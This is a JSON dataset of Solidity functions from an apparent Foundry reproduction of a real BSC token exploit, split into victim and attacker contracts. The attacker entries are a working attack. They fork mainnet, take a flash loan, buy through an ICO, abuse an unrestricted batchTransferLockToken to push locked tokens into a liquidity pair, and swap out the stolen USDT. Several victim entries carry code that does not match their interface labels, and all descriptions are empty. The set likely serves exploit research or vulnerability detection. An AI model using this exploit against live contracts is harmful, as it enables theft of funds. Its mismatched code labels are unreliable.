[
  {
    "contract/interface": "IPancakeRouter",
    "source_type": "victim_contract",
    "function_name": "getAmountsOut",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPancakeRouter",
    "source_type": "victim_contract",
    "function_name": "swapExactTokensForETHSupportingFeeOnTransferTokens",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPancakePair",
    "source_type": "victim_contract",
    "function_name": "DOMAIN_SEPARATOR",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPancakePair",
    "source_type": "victim_contract",
    "function_name": "MINIMUM_LIQUIDITY",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPancakePair",
    "source_type": "victim_contract",
    "function_name": "PERMIT_TYPEHASH",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPancakePair",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakePair",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, amount);\n        return true;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakePair",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakePair",
    "source_type": "victim_contract",
    "function_name": "burn",
    "original_code": "    function burn(uint256 amount) public virtual {\n        _burn(_msgSender(), amount);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakePair",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakePair",
    "source_type": "victim_contract",
    "function_name": "factory",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPancakePair",
    "source_type": "victim_contract",
    "function_name": "getReserves",
    "original_code": "    function getReserves() public view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) {\n        _reserve0 = reserve0;\n        _reserve1 = reserve1;\n        _blockTimestampLast = blockTimestampLast;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakePair",
    "source_type": "victim_contract",
    "function_name": "initialize",
    "original_code": "    function initialize(address _token0, address _token1) external {\n        require(msg.sender == factory, 'Pancake: FORBIDDEN'); // sufficient check\n        token0 = _token0;\n        token1 = _token1;\n    }\n\n    // update reserves and, on the first call per block, price accumulators\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakePair",
    "source_type": "victim_contract",
    "function_name": "kLast",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPancakePair",
    "source_type": "victim_contract",
    "function_name": "mint",
    "original_code": "    function mint(address to, uint256 amount) onlyOwner public override {\n        revert('Exceed Total Supply');\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakePair",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakePair",
    "source_type": "victim_contract",
    "function_name": "nonces",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPancakePair",
    "source_type": "victim_contract",
    "function_name": "permit",
    "original_code": "    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external {\n        require(deadline >= block.timestamp, 'Pancake: EXPIRED');\n        bytes32 digest = keccak256(\n            abi.encodePacked(\n                '\\x19\\x01',\n                DOMAIN_SEPARATOR,\n                keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline))\n            )\n        );\n        address recoveredAddress = ecrecover(digest, v, r, s);\n        require(recoveredAddress != address(0) && recoveredAddress == owner, 'Pancake: INVALID_SIGNATURE');\n        _approve(owner, spender, value);\n    }\n}\n\n// File: contracts\\libraries\\Math.sol\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakePair",
    "source_type": "victim_contract",
    "function_name": "price0CumulativeLast",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPancakePair",
    "source_type": "victim_contract",
    "function_name": "price1CumulativeLast",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPancakePair",
    "source_type": "victim_contract",
    "function_name": "skim",
    "original_code": "    function skim(address to) external lock {\n        address _token0 = token0; // gas savings\n        address _token1 = token1; // gas savings\n        _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));\n        _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));\n    }\n\n    // force reserves to match balances\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakePair",
    "source_type": "victim_contract",
    "function_name": "swap",
    "original_code": "    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {\n        require(amount0Out > 0 || amount1Out > 0, 'Pancake: INSUFFICIENT_OUTPUT_AMOUNT');\n        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings\n        require(amount0Out < _reserve0 && amount1Out < _reserve1, 'Pancake: INSUFFICIENT_LIQUIDITY');\n\n        uint balance0;\n        uint balance1;\n        { // scope for _token{0,1}, avoids stack too deep errors\n        address _token0 = token0;\n        address _token1 = token1;\n        require(to != _token0 && to != _token1, 'Pancake: INVALID_TO');\n        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens\n        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens\n        if (data.length > 0) IPancakeCallee(to).pancakeCall(msg.sender, amount0Out, amount1Out, data);\n        balance0 = IERC20(_token0).balanceOf(address(this));\n        balance1 = IERC20(_token1).balanceOf(address(this));\n        }\n        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;\n        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;\n        require(amount0In > 0 || amount1In > 0, 'Pancake: INSUFFICIENT_INPUT_AMOUNT');\n        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors\n        uint balance0Adjusted = (balance0.mul(10000).sub(amount0In.mul(25)));\n        uint balance1Adjusted = (balance1.mul(10000).sub(amount1In.mul(25)));\n        require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(10000**2), 'Pancake: K');\n        }\n\n        _update(balance0, balance1, _reserve0, _reserve1);\n        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);\n    }\n\n    // force balances to match reserves\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakePair",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakePair",
    "source_type": "victim_contract",
    "function_name": "sync",
    "original_code": "    function sync() external lock {\n        _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);\n    }\n}\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakePair",
    "source_type": "victim_contract",
    "function_name": "token0",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPancakePair",
    "source_type": "victim_contract",
    "function_name": "token1",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPancakePair",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakePair",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address _to, uint256 _amount) public override returns (bool) {\n        uint256 availableAmount = getAvailableBalance(_msgSender());\n        require(availableAmount >= _amount, \"Not Enough Available Token\");\n\n        return super.transfer(_to, _amount);\n    }\n\n    function transferFrom(address _from, address _to, uint256 _amount) public override returns (bool) {\n        uint256 availableAmount = getAvailableBalance(_from);\n        require(availableAmount >= _amount, \"Not Enough Available Token\");\n\n        return super.transferFrom(_from, _to, _amount);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPancakePair",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(address _from, address _to, uint256 _amount) public override returns (bool) {\n        uint256 availableAmount = getAvailableBalance(_from);\n        require(availableAmount >= _amount, \"Not Enough Available Token\");\n\n        return super.transferFrom(_from, _to, _amount);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ShibaToken_exp",
    "source_type": "attacker_contract",
    "function_name": "DPPFlashLoanCall",
    "original_code": "    function DPPFlashLoanCall(address, uint256, uint256, bytes memory) public {\n        xbb4c.balanceOf(r);\n        xbb4c.withdraw(20_000_000_000_000_000_000);\n        x55d3.approve(\n            address(xa422),\n            115_792_089_237_316_195_423_570_985_008_687_907_853_269_984_665_640_564_039_457_584_007_913_129_639_935\n        );\n        x55d3.transfer(xb9bd, 0);\n        xa422.buyByBnb{value: 20_000_000_000_000_000_000}(x0000);\n        x13b1.balanceOf(r);\n        address[] memory path = new address[](2);\n        path[0] = address(x13b1);\n        path[1] = address(x55d3);\n        x10ed.getAmountsOut(507_677_278_570_125_202_361_500_000, path);\n\n        ISHIBA.Airdrop[] memory airdrops = new ISHIBA.Airdrop[](1);\n        airdrops[0] = ISHIBA.Airdrop(address(xa19d), 507_677_278_570_125_202_361_500_000);\n        x13b1.batchTransferLockToken(airdrops);\n        xa19d.swap(0, 30_948_073_916_467_640_719_090, r, \"\");\n        x55d3.balanceOf(r);\n        x55d3.approve(\n            address(x10ed),\n            115_792_089_237_316_195_423_570_985_008_687_907_853_269_984_665_640_564_039_457_584_007_913_129_639_935\n        );\n\n        address[] memory path2 = new address[](2);\n        path2[0] = address(x55d3);\n        path2[1] = address(xbb4c);\n        x10ed.swapExactTokensForETHSupportingFeeOnTransferTokens(\n            30_948_073_916_467_640_719_090, 0, path2, r, 1_700_095_314\n        );\n        xbb4c.deposit{value: 121_697_224_718_492_366_219}();\n        xbb4c.transfer(address(xfeaf), 20_000_000_000_000_000_000);\n        xbb4c.balanceOf(r);\n        xbb4c.transfer(address(x1874), 101_697_224_718_492_366_219);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ShibaToken_exp",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ShibaToken_exp",
    "source_type": "attacker_contract",
    "function_name": "claim",
    "original_code": "    function claim(\n        uint256\n    ) public {\n        xfeaf.flashLoan(20_000_000_000_000_000_000, 0, r, hex\"00\");\n        x55d3.balanceOf(r);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ShibaToken_exp",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ShibaToken_exp",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ShibaToken_exp",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ShibaToken_exp",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ShibaToken_exp",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"https://rpc.ankr.com/bsc\", 33_528_882);\n        // vm.createSelectFork(\"https://rpc.ankr.com/bsc\", bytes32(0x75a26224da9faf37c2b3a4a634a096af7fec561f631a02c93e11e4a19d159477));\n    }\n\n    IPancakeRouter constant x10ed = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    IPancakePair constant x55d3 = IPancakePair(0x55d398326f99059fF775485246999027B3197955);\n    IPancakePair constant xa19d = IPancakePair(0xa19D2674A8E2709a92e04403F721d8448f802e1f);\n    ISHIBA constant x13b1 = ISHIBA(0x13B1F2E227cA6f8e08aC80368fd637f5084F10a5);\n    IWBNB constant xbb4c = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    ICO constant xa422 = ICO(0xA4227de36398851aEBf4A2506008D0Aab2dd0E71);\n    IDPPOracle constant xfeaf = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);\n    address constant x0000 = 0x0000000000000000000000000000000000000000;\n    address constant x1874 = 0x1874726c8c9a501836929F495A8b44968FBfdad8;\n    address constant xb9bd = 0xb9bdc2537C6F4B587A5C81A67e7e3a4e6dDDa189;\n\n",
    "description": ""
  },
  {
    "contract/interface": "ShibaToken_exp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ShibaToken_exp",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ShibaToken_exp",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ShibaToken_exp",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ShibaToken_exp",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ShibaToken_exp",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ShibaToken_exp",
    "source_type": "attacker_contract",
    "function_name": "test",
    "original_code": "    function test() public {\n        // vm.prank(0xb9bdc2537C6F4B587A5C81A67e7e3a4e6dDDa189, 0xb9bdc2537C6F4B587A5C81A67e7e3a4e6dDDa189);\n        claim(20);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ISHIBA",
    "source_type": "victim_contract",
    "function_name": "batchTransferLockToken",
    "original_code": "    function batchTransferLockToken(Airdrop[] memory _airdrops) public {\n        for (uint256 i = 0; i < _airdrops.length; i++) {\n            // don't use this.transferTokenLock because payer modifier\n            address wallet = _airdrops[i].wallet;\n            uint256 amount = _airdrops[i].amount;\n\n            users[wallet].lockedBalance = users[wallet].lockedBalance.add(amount);\n            users[wallet].unlockPerSecond = users[wallet].lockedBalance.mul(unlockPercent).div(100).div(duration);\n\n            super.transfer(wallet, amount);\n        }\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDPPOracle",
    "source_type": "victim_contract",
    "function_name": "flashLoan",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ICO",
    "source_type": "victim_contract",
    "function_name": "buyByBnb",
    "original_code": "    function buyByBnb(address _referrer) external payable {\n        validate(msg.value);\n\n        uint256 stablePerBnb = uint256(getLatestPrice()); // USDT/ETH\n        uint256 amount       = msg.value.mul(10 ** 18).div(stablePerBnb);\n        uint256 buyAmount    = amount.mul(amountPerStable);\n        require(buyAmount   <= token.balanceOf(address(this)), \"Not Enough Token To Buy\");\n\n        token.transferLockToken(msg.sender, buyAmount);\n\n        // lv1\n        if (_referrer != address (0)) {\n            if (referrers[msg.sender] != address (0))\n                _referrer = referrers[msg.sender];\n\n            payable(_referrer).transfer(msg.value * 5 / 100);\n\n            // lv2\n            address lv2 = referrers[_referrer];\n            if (lv2 != address (0)) {\n                payable(lv2).transfer(msg.value * 3 / 100);\n\n                // lv3\n                address lv3 = referrers[lv2];\n                if (lv3 != address (0)) {\n                    payable(lv3).transfer(msg.value * 2 / 100);\n\n                    // lv4\n                    address lv4 = referrers[lv3];\n                    if (lv4 != address (0)) {\n                        payable(lv4).transfer(msg.value * 1 / 100);\n                    }\n                }\n            }\n        }\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IWBNB",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IWBNB",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "    function withdraw() external onlyOwner {\n        payable(msg.sender).transfer(address(this).balance);\n        usdtToken.transfer(msg.sender, usdtToken.balanceOf(address(this)));\n        busdToken.transfer(msg.sender, busdToken.balanceOf(address(this)));\n    }\n}\n",
    "description": ""
  }
]